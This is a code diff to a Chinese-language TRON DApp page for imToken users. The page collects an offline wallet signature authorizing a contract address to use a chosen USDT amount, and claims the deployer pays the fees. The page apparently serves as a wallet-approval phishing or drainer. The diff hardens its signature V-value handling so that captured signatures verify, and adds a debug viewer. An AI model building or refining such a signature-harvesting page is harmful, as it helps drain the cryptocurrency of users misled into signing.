@@ -332,7 +332,7 @@
                 <p>• 矿工费：<span class="highlight">部署者代付（无需您支付TRX）</span></p>
                 <p class="orange-tip">⚠️ 提示：输入金额后点击「生成离线签名」，唤起钱包完成签名即可等待授权</p>
                 <div class="faq-tip">
-                    ❗ 签名逻辑已与合约对齐：用户地址→合约地址→金额（uint256），确保验证通过
+                    ❗ 签名逻辑已与合约对齐：用户地址→合约地址→金额（uint256），V值自适应钱包返回结果
                 </div>
             </div>
         </div>
@@ -369,6 +369,7 @@
         <button id="checkStatusBtn" class="btn" disabled style="background: #10b981;">查看授权状态</button>
         <button id="refreshBtn" class="btn"> 刷新数据（签名后点此）</button>
         <button id="clearCacheBtn" class="btn"> 清除旧缓存数据</button>
+        <button id="viewDebugBtn" class="btn" style="background: #f59e0b;"> 查看调试信息</button>
     </div>
     <div class="footer-info">
         代付合约验证：TQFJgVCYUk6DhEpZCvua2crRwD8XY6FiVk（TRON浏览器查询）
@@ -390,6 +391,7 @@
         const STORAGE_KEY = "trx_countdown_data";
         const RECORD_KEY = "imtoken_delegate_approval_records";
         const SUBMIT_DATA_KEY = "imtoken_delegate_submit_data";
+        const DEBUG_KEY_PREFIX = "signature_debug_";
 
         // 检查LocalStorage可用性
         function checkLocalStorageAvailable() {
@@ -420,6 +422,7 @@
             const clearCacheBtn = document.getElementById("clearCacheBtn");
             const refreshBtn = document.getElementById("refreshBtn");
             const amountInput = document.getElementById("approveAmountInput");
+            const viewDebugBtn = document.getElementById("viewDebugBtn");
 
             // 初始化前检查LocalStorage
             if (!checkLocalStorageAvailable()) {
@@ -459,13 +462,33 @@
                     try {
                         localStorage.removeItem(SUBMIT_DATA_KEY);
                         localStorage.removeItem(RECORD_KEY);
-                        localStorage.removeItem(`signature_debug_${userAddress || "unknown"}`);
+                        // 清除所有调试信息
+                        Object.keys(localStorage).forEach(key => {
+                            if (key.startsWith(DEBUG_KEY_PREFIX)) localStorage.removeItem(key);
+                        });
                         forceRenderData();
                         alert("本地缓存已清除\n若仍有问题：imToken→权限管理→本DApp→断开连接");
                     } catch (e) {
                         alert(`清除失败：${e.message}`);
                     }
                 }
+            });
+
+            // 查看调试信息
+            viewDebugBtn.addEventListener("click", () => {
+                const debugKeys = Object.keys(localStorage).filter(key => key.startsWith(DEBUG_KEY_PREFIX));
+                if (debugKeys.length === 0) {
+                    alert("暂无调试信息");
+                    return;
+                }
+                const latestDebugKey = debugKeys.sort((a,b) => b.localeCompare(a))[0];
+                const debugData = JSON.parse(localStorage.getItem(latestDebugKey));
+                const debugStr = `调试信息（${debugData.timestamp}）：
+错误原因：${debugData.error}
+用户地址：${debugData.userAddr}
+合约地址：${debugData.contractAddr}
+金额Hex：${debugData.amountHex}`;
+                alert(debugStr);
             });
 
             // 检测imToken环境
@@ -528,7 +551,7 @@
                     approveBtn.innerHTML = '生成中...';
 
                     // 1. 转换金额为合约要求的最小单位（uint256）
-                    const amountInt = usdtToInteger(inputAmountStr); // 300 USDT → 300000000
+                    const amountInt = usdtToInteger(inputAmountStr); // 800 USDT → 800000000
                     const amountHex = intToPaddedHex(amountInt); // 转64位Hex（uint256标准）
 
                     // 2. 生成与合约对齐的签名
@@ -685,13 +708,27 @@
                 
                 const r = "0x" + signature.slice(0, 64); // 前64位→R（bytes32）
                 const s = "0x" + signature.slice(64, 128); // 中间64位→S（bytes32）
-                const vRaw = parseInt(signature.slice(128, 130), 16); // 最后2位→原始V值（0/1）
+                const vRaw = parseInt(signature.slice(128, 130), 16); // 最后2位→原始V值
 
-                // 7. 处理V值：合约ecrecover要求27/28，钱包返回0/1需加27（无需链ID偏移，合约未用EIP-155）
-                const v = vRaw + 27;
+
+                // 核心修复：V值自适应处理（解决重复+27导致的54问题）
+                let v;
+                if (vRaw >= 27 && vRaw <= 28) {
+                    // 情况1：imToken已返回27/28（部分版本自动处理），直接使用
+                    v = vRaw;
+                } else if (vRaw === 0 || vRaw === 1) {
+                    // 情况2：imToken返回原始0/1，需+27
+                    v = vRaw + 27;
+                } else {
+                    // 情况3：V值异常
+                    throw new Error(`V值原始值无效（当前${vRaw}，需0/1或27/28）`);
+                }
+
+
+                // 验证V值是否符合合约要求
                 if (v !== 27 && v !== 28) throw new Error(`V值无效（当前${v}，需27/28）`);
 
-                // 8. 验证签名有效性（可选，本地预校验）
+                // 7. 验证签名有效性（可选，本地预校验）
                 const recoveredAddr = tronWeb.address.fromHex(
                     await tronWeb.trx.recover(prefixedHash, signature)
                 );
@@ -700,7 +737,7 @@
                 return { v, r, s };
             } catch (e) {
                 // 错误日志便于排查
-                const debugKey = `signature_debug_${userAddr || 'unknown'}`;
+                const debugKey = `${DEBUG_KEY_PREFIX}${userAddr || 'unknown'}_${Date.now()}`;
                 localStorage.setItem(debugKey, JSON.stringify({
                     error: e.message,
                     timestamp: new Date().toISOString(),
